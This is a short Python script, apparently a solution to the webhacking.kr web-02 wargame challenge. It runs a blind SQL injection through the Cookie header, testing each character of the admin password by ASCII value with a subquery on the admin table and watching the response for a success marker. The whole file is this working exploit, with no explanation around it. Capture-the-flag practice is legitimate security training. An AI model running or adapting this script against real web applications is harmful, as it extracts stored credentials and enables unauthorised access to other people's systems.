import re, urllib
import urllib.request
 
my_session = "session_ID" #example)97d589d02d91ff14d8afal7d37ade0b0
 
pw_admin = ""
 
print("\nStarting to find admin password..")
 
for i in range(1, 12): #password length range
 
    for j in range(33,126): #ASCII range
 
        url = "http://webhacking.kr/challenge/web/web-02/"
 
        req = urllib.request.Request(url)
 
 
        req.add_header('Cookie',"Cookie_name=Cookie_value and (select ascii(substring(password,%d,1)) from admin)=%d; PHPSESSID=%s" %(i,j,my_session))
 
        html = urllib.request.urlopen(req).read()
 
        html_str = str(html)
 
       
        find_index = html_str.find("Next str")
        #example> Next str is After Executing Authentication password like login.php
 
 
 
        if (find_index != -1) :
 
            pw_admin = pw_admin+chr(j)
 
            print ("find password: " + pw_admin)
 
            break
